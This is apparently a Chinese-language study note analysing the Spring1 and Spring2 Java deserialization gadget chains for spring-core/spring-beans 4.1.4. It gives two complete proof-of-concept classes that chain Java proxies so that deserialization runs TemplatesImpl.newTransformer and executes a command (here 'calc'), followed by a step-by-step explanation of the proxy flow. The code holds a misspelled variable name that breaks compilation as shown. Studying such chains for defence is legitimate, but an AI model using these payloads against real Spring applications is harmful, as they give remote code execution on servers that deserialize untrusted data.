# Spring

## exp

```java
package dem0.deserialization.spring;

import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.util.Gadgets;

import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;

public class spring1 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("calc");
        Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        //代理getObject
        HashMap<String, Object> map = new HashMap();
        map.put("getObject", templates);
        InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(Target.class,map);
        ObjectFactory<?> factory = (ObjectFactory<?>) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);
        // 设置ObjectFactoryDelegatingInvocationHandler ==> 被代理的factory
        // this.objectFactory.getObject() ==> templates
        Class<?>       clazz          = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Constructor<?> czconstructor = clazz.getDeclaredConstructors()[0];
        czconstructor.setAccessible(true);
        InvocationHandler  obInvocation= (InvocationHandler)czconstructor.newInstance(factory);
        //obInvocation ===> 本身是一个代理类 this.provider.getType()
        // ==> obInvocation.getType ==> obInvocation.getObject
        // ==> 返回template
        
        //typetemplateproxy (type Template) 既有getType 又有newTransfrom
        // 代理getType
        Type typetemplateproxy = (Type)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Type.class, Templates.class}, obInvocation);
        HashMap<String, Object> mp = new HashMap();
        mp.put("getType", typetemplateproxy);
        InvocationHandler newInvocationHandler = (InvocationHandler)constructor.newInstance(Target.class, mp);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
        Object typeProvjavaiderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
            new Class[]{typeProviderClass}, newInvocationHandler);
        Class<?> MTProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = MTProvider.getDeclaredConstructors()[0];
        cons.setAccessible(true);
        // 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
        // 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field field   = MTProvider.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");
        byte[] serialize = Serializer.serialize(objects);
        Deserializer.deserialize(serialize);
    }
}
```



## 分析

### MethodInvokeTypeProvider

在spring的core包里面有。实现了TypeProvider，说明是可以序列化的。

![image-20220513234515123](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220513234515123.png)

调用了 ReflectionUtils 先是 `findMethod` 返回 Method 对象然后紧接着调用 `invokeMethod` 反射调用。注意，这里的调用是无参调用。如果可以把这个methodName改成`newTransform`,`this.provider.getType()` 想办法处理成 TemplatesImpl.就可以触发漏洞了。

### ObjectFactoryDelegatingInvocationHandler

`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler` 是 InvocationHandler 的实现类.注释中Reflective InvocationHandler for lazy access to the current target object.（用于延迟访问当前目标对象的反射调用处理程序。）实例化的时候会接受objectFactory一个参数，并且在Invoke的时候调用getObject。

![image-20220513235148796](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220513235148796.png)

ObjectFactory 的 getObject 方法返回的对象是泛型的，那就可以可用 AnnotationInvocationHandler 来代理，返回任意对象。

而 ObjectFactoryDelegatingInvocationHandler 自己本身就是代理类，可以用它代理之前的TypeProvider 的 getType 方法。

### 动态代理过程

![image-20220514093123817](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220514093123817.png)

![image-20220514093300540](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220514093300540.png)

这次`method`是`newTranfrom`.然后`invoke`,触发`typetemplateproxy`

![image-20220514093409438](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220514093409438.png)

然后触发

![image-20220514093437655](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220514093437655.png)

结束。

```
mp.put("getType", typetemplateproxy); ===> 为什么不直接返回templates呢？ 因为这里涉及到类型转换需要转换到type.
Type typetemplateproxy = (Type)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Type.class, Templates.class}, obInvocation);
这也是为什么需要这一步的主要原因。
```

## 依赖

> spring-core : 4.1.4.RELEASE
> spring-beans : 4.1.4.RELEASE
> jdk 1.7

## spring2

![image-20220514094848697](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220514094848697.png)

![image-20220514094900102](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220514094900102.png)

```java
JdkDynamicAopProxy ==> ObjectFactoryDelegatingInvocationHandler
```

```java
package dem0.deserialization.spring;

import org.springframework.aop.TargetSource;
import org.springframework.aop.framework.AdvisedSupport;
import ysoserial.payloads.util.Gadgets;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.Type;
import java.util.HashMap;

public class spring2 {
    public static void main(String[] args) throws Exception{
        final Object templates = Gadgets.createTemplatesImpl("calc");
        Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        //代理getObject
        HashMap<String, Object> map = new HashMap();
        map.put("getTarget", templates);
        InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(Target.class,map);
        TargetSource targetSource = (TargetSource) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{TargetSource.class}, invocationHandler);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTargetSource(targetSource);
        // 设置ObjectFactoryDelegatingInvocationHandler ==> 被代理的factory
        // this.objectFactory.getObject() ==> templates
        Class<?>       clazz          = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> czconstructor = clazz.getDeclaredConstructors()[0];
        czconstructor.setAccessible(true);
        InvocationHandler  obInvocation= (InvocationHandler)czconstructor.newInstance(advisedSupport);


        //obInvocation ===> 本身是一个代理类 this.provider.getType()
        // ==> obInvocation.getType ==> obInvocation.getObject
        // ==> 返回template

        //typetemplateproxy (type Template) 既有getType 又有newTransfrom
        // 代理getType
        Type typetemplateproxy = (Type)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Type.class, Templates.class}, obInvocation);


        HashMap<String, Object> mp = new HashMap();
        mp.put("getType", typetemplateproxy);
        InvocationHandler newInvocationHandler = (InvocationHandler)constructor.newInstance(Target.class, mp);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
            new Class[]{typeProviderClass}, newInvocationHandler);

        Class<?> MTProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = MTProvider.getDeclaredConstructors()[0];
        cons.setAccessible(true);
        // 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
        // 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
        Object objects = cons.newInstance(typeProviderProxy, Templates.class.getDeclaredMethod("newTransformer"), 0);
//        Field field   = MTProvider.getDeclaredField("methodName");
//        field.setAccessible(true);
//        field.set(objects, "newTransformer");
//        byte[] serialize = Serializer.serialize(objects);
//        Deserializer.deserialize(serialize);
    }
}

```

